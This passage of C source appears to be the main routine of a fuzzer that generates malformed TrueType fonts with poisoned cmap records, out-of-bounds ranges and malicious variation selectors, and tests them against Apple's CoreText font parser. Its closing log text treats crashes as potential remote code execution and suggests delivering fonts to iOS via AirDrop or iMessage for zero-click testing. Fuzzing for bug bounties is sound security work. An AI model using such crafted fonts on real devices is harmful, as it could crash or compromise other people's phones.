    uint8_t *font = assemble_font(sub, total, recs, 1, 256, out_size);
    free(sub);
    return font;
}

/*
 * Dual records: valid + poisoned encoding in same cmap table
 */
static uint8_t *build_dual_record(uint16_t format, uint16_t enc, size_t *out_size) {
    uint8_t sub[16384];
    size_t sub_sz = build_subtable(format, sub, sizeof(sub));
    if (sub_sz == 0) return NULL;

    CmapRecord recs[] = {
        {0, 3},      // valid Unicode BMP
        {0, enc},    // poisoned
        {3, 1},      // valid Windows Unicode BMP
        {3, enc},    // poisoned Windows
    };
    return assemble_font(sub, sub_sz, recs, 4, 256, out_size);
}

/*
 * Triple duplicate records all with encoding=256
 */
static uint8_t *build_triple_dup(uint16_t format, size_t *out_size) {
    uint8_t sub[16384];
    size_t sub_sz = build_subtable(format, sub, sizeof(sub));
    if (sub_sz == 0) return NULL;

    CmapRecord recs[] = {
        {0, 256},
        {0, 256},
        {0, 256},
    };
    return assemble_font(sub, sub_sz, recs, 3, 256, out_size);
}

// =========================================================================
// MAIN
// =========================================================================

int main(int argc, char **argv) {
    const char *outdir = "/tmp/cmap_fuzz";
    const char *logfile = "/tmp/cmap_fuzz_results.txt";

    if (argc > 1) outdir = argv[1];
    if (argc > 2) logfile = argv[2];

    mkdir(outdir, 0755);

    g_log = fopen(logfile, "w");
    if (!g_log) {
        fprintf(stderr, "Cannot open log file: %s\n", logfile);
        return 1;
    }

    time_t start = time(NULL);
    log_msg("=============================================================\n");
    log_msg("  CoreText cmap Variant Fuzzer - ASAN/UBSAN Memory Hunter\n");
    log_msg("  Started: %s", ctime(&start));
    log_msg("  Output: %s\n", outdir);
    log_msg("  Log: %s\n", logfile);
    log_msg("=============================================================\n\n");

    // Print test matrix
    int total_standard = NUM_FUZZ_FORMATS * NUM_FUZZ_ENCODINGS * NUM_FUZZ_PLATFORMS;
    int total_specials = NUM_FUZZ_FORMATS * 3;  // dual, triple, per-format specials
    int total_special_combos = 5 * NUM_FUZZ_ENCODINGS * NUM_FUZZ_PLATFORMS; // special builders

    log_msg("Test matrix:\n");
    log_msg("  Standard: %d formats x %d encodings x %d platforms = %d\n",
            NUM_FUZZ_FORMATS, NUM_FUZZ_ENCODINGS, NUM_FUZZ_PLATFORMS, total_standard);
    log_msg("  Special variants: ~%d\n", total_specials + total_special_combos);
    log_msg("  Total estimated: ~%d tests\n\n", total_standard + total_specials + total_special_combos);

    // ---- Phase 1: Standard matrix ----
    log_msg("========== PHASE 1: Standard Matrix ==========\n");
    log_msg("%-8s %-6s %-6s %-6s %-10s %s\n",
            "FORMAT", "ENC", "PLAT", "LOAD", "RESULT", "DETAILS");
    log_msg("-----------------------------------------------------------\n");

    for (int fi = 0; fi < NUM_FUZZ_FORMATS; fi++) {
        uint16_t format = FUZZ_FORMATS[fi];
        uint8_t subtable[16384];
        size_t st_sz = build_subtable(format, subtable, sizeof(subtable));
        if (st_sz == 0) {
            log_msg("%-8s SKIP (builder returned 0)\n", format_name(format));
            continue;
        }

        for (int ei = 0; ei < NUM_FUZZ_ENCODINGS; ei++) {
            uint16_t enc = FUZZ_ENCODINGS[ei];
            for (int pi = 0; pi < NUM_FUZZ_PLATFORMS; pi++) {
                uint16_t plat = FUZZ_PLATFORMS[pi];

                CmapRecord recs[] = {{plat, enc}};
                size_t font_size;
                uint8_t *font = assemble_font(subtable, st_sz, recs, 1, 256, &font_size);
                if (!font) continue;

                // Save font
                char path[512];
                snprintf(path, sizeof(path), "%s/%s_enc%u_plat%u.ttf",
                         outdir, format_name(format), enc, plat);
                FILE *f = fopen(path, "wb");
                if (f) { fwrite(font, 1, font_size, f); fclose(f); }

                // Run test
                TestCase tc = { format, enc, plat, "standard" };
                FuzzResult result;
                int status = run_test_case(font, font_size, &tc, &result);

                g_total_tests++;

                const char *status_str;
                switch (status) {
                    case 0:  status_str = "OK";       g_ok++;         break;
                    case 1:  status_str = "*** HANG ***";  g_hangs++;     break;
                    case 2:  status_str = "*** CRASH ***"; g_crashes++;   break;
                    case 3:  status_str = "*** ASAN ***";  g_asan_hits++; break;
                    case 4:  status_str = "ANOMALY";  g_anomalies++;    break;
                    default: status_str = "ERROR";    break;
                }

                // Log interesting results
                if (status != 0) {
                    char details[256] = "";
                    if (status == 1) {
                        snprintf(details, sizeof(details), "timeout=%ds", TIMEOUT_SEC);
                    } else if (status == 2) {
                        snprintf(details, sizeof(details), "signal=%s(%d)",
                                 signal_name(result.crash_signal), result.crash_signal);
                    } else if (status == 4) {
                        snprintf(details, sizeof(details), "glyphs=[%u,%u,%u,%u]",
                                 result.sample_glyphs[0], result.sample_glyphs[1],
                                 result.sample_glyphs[2], result.sample_glyphs[3]);
                    }

                    log_msg("%-8s enc=%-5u plat=%-2u load=%-3s %-13s %s\n",
                            format_name(format), enc, plat,
                            result.loaded ? "yes" : "no",
                            status_str, details);
                }

                free(font);
            }
        }
    }

    // ---- Phase 2: Special format 6 variants ----
    log_msg("\n========== PHASE 2: Format 6 Boundary Attacks ==========\n");

    struct {
        const char *name;
        uint8_t *(*builder)(uint16_t enc, uint16_t plat, size_t *out_size);
    } fmt6_specials[] = {
        {"fmt6_wrap",     build_special_fmt6_wrap},
        {"fmt6_maxentry", build_special_fmt6_maxentry},
    };

    for (int si = 0; si < 2; si++) {
        for (int ei = 0; ei < NUM_FUZZ_ENCODINGS; ei++) {
            uint16_t enc = FUZZ_ENCODINGS[ei];
            for (int pi = 0; pi < NUM_FUZZ_PLATFORMS; pi++) {
                uint16_t plat = FUZZ_PLATFORMS[pi];

                size_t font_size;
                uint8_t *font = fmt6_specials[si].builder(enc, plat, &font_size);
                if (!font) continue;

                char path[512];
                snprintf(path, sizeof(path), "%s/%s_enc%u_plat%u.ttf",
                         outdir, fmt6_specials[si].name, enc, plat);
                FILE *f = fopen(path, "wb");
                if (f) { fwrite(font, 1, font_size, f); fclose(f); }

                TestCase tc = { 6, enc, plat, fmt6_specials[si].name };
                FuzzResult result;
                int status = run_test_case(font, font_size, &tc, &result);

                g_total_tests++;

                if (status != 0) {
                    const char *s = (status == 1) ? "HANG" : (status == 2) ? "CRASH" :
                                    (status == 3) ? "ASAN" : "ANOMALY";
                    log_msg("  %-15s enc=%-5u plat=%-2u *** %s *** signal=%d\n",
                            fmt6_specials[si].name, enc, plat, s,
                            result.crash_signal);
                    if (status == 2) g_crashes++;
                    else if (status == 1) g_hangs++;
                    else if (status == 3) g_asan_hits++;
                    else g_anomalies++;
                } else {
                    g_ok++;
                }

                free(font);
            }
        }
    }

    // ---- Phase 3: Format 2 OOB range attacks ----
    log_msg("\n========== PHASE 3: Format 2 OOB Range Attacks ==========\n");

    for (int ei = 0; ei < NUM_FUZZ_ENCODINGS; ei++) {
        uint16_t enc = FUZZ_ENCODINGS[ei];
        for (int pi = 0; pi < NUM_FUZZ_PLATFORMS; pi++) {
            uint16_t plat = FUZZ_PLATFORMS[pi];

            size_t font_size;
            uint8_t *font = build_special_fmt2_oob_range(enc, plat, &font_size);
            if (!font) continue;

            char path[512];
            snprintf(path, sizeof(path), "%s/fmt2_oob_enc%u_plat%u.ttf",
                     outdir, enc, plat);
            FILE *f = fopen(path, "wb");
            if (f) { fwrite(font, 1, font_size, f); fclose(f); }

            TestCase tc = { 2, enc, plat, "fmt2_oob_range" };
            FuzzResult result;
            int status = run_test_case(font, font_size, &tc, &result);

            g_total_tests++;

            if (status != 0) {
                const char *s = (status == 1) ? "HANG" : (status == 2) ? "CRASH" :
                                (status == 3) ? "ASAN" : "ANOMALY";
                log_msg("  fmt2_oob enc=%-5u plat=%-2u *** %s *** signal=%d\n",
                        enc, plat, s, result.crash_signal);
                if (status == 2) g_crashes++;
                else if (status == 1) g_hangs++;
                else if (status == 3) g_asan_hits++;
                else g_anomalies++;
            } else {
                g_ok++;
            }

            free(font);
        }
    }

    // ---- Phase 4: Format 0 boundary attacks ----
    log_msg("\n========== PHASE 4: Format 0 Boundary Attacks ==========\n");

    for (int ei = 0; ei < NUM_FUZZ_ENCODINGS; ei++) {
        uint16_t enc = FUZZ_ENCODINGS[ei];
        for (int pi = 0; pi < NUM_FUZZ_PLATFORMS; pi++) {
            uint16_t plat = FUZZ_PLATFORMS[pi];

            size_t font_size;
            uint8_t *font = build_special_fmt0_boundary(enc, plat, &font_size);
            if (!font) continue;

            TestCase tc = { 0, enc, plat, "fmt0_boundary" };
            FuzzResult result;
            int status = run_test_case(font, font_size, &tc, &result);

            g_total_tests++;

            if (status != 0) {
                const char *s = (status == 1) ? "HANG" : (status == 2) ? "CRASH" :
                                (status == 3) ? "ASAN" : "ANOMALY";
                log_msg("  fmt0_bound enc=%-5u plat=%-2u *** %s *** signal=%d\n",
                        enc, plat, s, result.crash_signal);
                if (status == 2) g_crashes++;
                else if (status == 1) g_hangs++;
                else if (status == 3) g_asan_hits++;
                else g_anomalies++;
            } else {
                g_ok++;
            }

            free(font);
        }
    }

    // ---- Phase 5: Format 14 malicious variation selectors ----
    log_msg("\n========== PHASE 5: Format 14 Malicious Variation Selectors ==========\n");

    for (int ei = 0; ei < NUM_FUZZ_ENCODINGS; ei++) {
        uint16_t enc = FUZZ_ENCODINGS[ei];
        for (int pi = 0; pi < NUM_FUZZ_PLATFORMS; pi++) {
            uint16_t plat = FUZZ_PLATFORMS[pi];

            size_t font_size;
            uint8_t *font = build_special_fmt14_malicious(enc, plat, &font_size);
            if (!font) continue;

            TestCase tc = { 14, enc, plat, "fmt14_malicious" };
            FuzzResult result;
            int status = run_test_case(font, font_size, &tc, &result);

            g_total_tests++;

            if (status != 0) {
                const char *s = (status == 1) ? "HANG" : (status == 2) ? "CRASH" :
                                (status == 3) ? "ASAN" : "ANOMALY";
                log_msg("  fmt14_mal enc=%-5u plat=%-2u *** %s *** signal=%d\n",
                        enc, plat, s, result.crash_signal);
                if (status == 2) g_crashes++;
                else if (status == 1) g_hangs++;
                else if (status == 3) g_asan_hits++;
                else g_anomalies++;
            } else {
                g_ok++;
            }

            free(font);
        }
    }

    // ---- Phase 6: Dual-record poison tests ----
    log_msg("\n========== PHASE 6: Dual-Record Poison Tests ==========\n");

    uint16_t poison_encs[] = { 256, 257, 512, 32768, 65535 };
    int n_poison = sizeof(poison_encs) / sizeof(poison_encs[0]);

    for (int fi = 0; fi < NUM_FUZZ_FORMATS; fi++) {
        uint16_t format = FUZZ_FORMATS[fi];
        for (int pe = 0; pe < n_poison; pe++) {
            size_t font_size;
            uint8_t *font = build_dual_record(format, poison_encs[pe], &font_size);
            if (!font) continue;

            char path[512];
            snprintf(path, sizeof(path), "%s/dual_%s_enc%u.ttf",
                     outdir, format_name(format), poison_encs[pe]);
            FILE *f = fopen(path, "wb");
            if (f) { fwrite(font, 1, font_size, f); fclose(f); }

            TestCase tc = { format, poison_encs[pe], 0, "dual_record" };
            FuzzResult result;
            int status = run_test_case(font, font_size, &tc, &result);

            g_total_tests++;

            if (status != 0) {
                const char *s = (status == 1) ? "HANG" : (status == 2) ? "CRASH" :
                                (status == 3) ? "ASAN" : "ANOMALY";
                log_msg("  dual_%s enc=%-5u *** %s *** signal=%d\n",
                        format_name(format), poison_encs[pe], s,
                        result.crash_signal);
                if (status == 2) g_crashes++;
                else if (status == 1) g_hangs++;
                else if (status == 3) g_asan_hits++;
                else g_anomalies++;
            } else {
                g_ok++;
            }

            free(font);
        }
    }

    // ---- Phase 7: Triple duplicate tests ----
    log_msg("\n========== PHASE 7: Triple Duplicate Records (enc=256) ==========\n");

    for (int fi = 0; fi < NUM_FUZZ_FORMATS; fi++) {
        uint16_t format = FUZZ_FORMATS[fi];
        size_t font_size;
        uint8_t *font = build_triple_dup(format, &font_size);
        if (!font) continue;

        char path[512];
        snprintf(path, sizeof(path), "%s/triple_%s_enc256.ttf",
                 outdir, format_name(format));
        FILE *f = fopen(path, "wb");
        if (f) { fwrite(font, 1, font_size, f); fclose(f); }

        TestCase tc = { format, 256, 0, "triple_dup" };
        FuzzResult result;
        int status = run_test_case(font, font_size, &tc, &result);

        g_total_tests++;

        if (status != 0) {
            const char *s = (status == 1) ? "HANG" : (status == 2) ? "CRASH" :
                            (status == 3) ? "ASAN" : "ANOMALY";
            log_msg("  triple_%s *** %s *** signal=%d\n",
                    format_name(format), s, result.crash_signal);
            if (status == 2) g_crashes++;
            else if (status == 1) g_hangs++;
            else if (status == 3) g_asan_hits++;
            else g_anomalies++;
        } else {
            g_ok++;
        }

        free(font);
    }

    // ---- Summary ----
    time_t end = time(NULL);
    log_msg("\n=============================================================\n");
    log_msg("  FUZZING COMPLETE\n");
    log_msg("=============================================================\n");
    log_msg("Duration:    %ld seconds\n", (long)(end - start));
    log_msg("Total tests: %d\n", g_total_tests);
    log_msg("OK:          %d\n", g_ok);
    log_msg("HANGS:       %d\n", g_hangs);
    log_msg("CRASHES:     %d  <-- POTENTIAL RCE\n", g_crashes);
    log_msg("ASAN hits:   %d  <-- MEMORY CORRUPTION\n", g_asan_hits);
    log_msg("UBSAN hits:  %d  <-- UNDEFINED BEHAVIOR\n", g_ubsan_hits);
    log_msg("Anomalies:   %d  <-- UNEXPECTED GLYPH VALUES\n", g_anomalies);
    log_msg("=============================================================\n");

    if (g_crashes > 0 || g_asan_hits > 0) {
        log_msg("\n!!! FINDINGS DETECTED - CHECK FONTS IN %s !!!\n", outdir);
        log_msg("Each crash/ASAN font is a potential $50K-$150K Apple bounty.\n");
        log_msg("Next steps:\n");
        log_msg("  1. Run cmap_deep_analysis on each crashing font\n");
        log_msg("  2. Get ASAN stack trace with symbolication\n");
        log_msg("  3. Minimize the font to smallest crashing case\n");
        log_msg("  4. Test on iOS via AirDrop or iMessage for zero-click\n");
    }

    if (g_hangs > 0) {
        log_msg("\nHANGS detected - same code path as confirmed enc=256 infinite loop.\n");
        log_msg("These may share root cause with the confirmed bug.\n");
    }

    if (g_log) fclose(g_log);
    return (g_crashes > 0 || g_asan_hits > 0) ? 2 : 0;
}
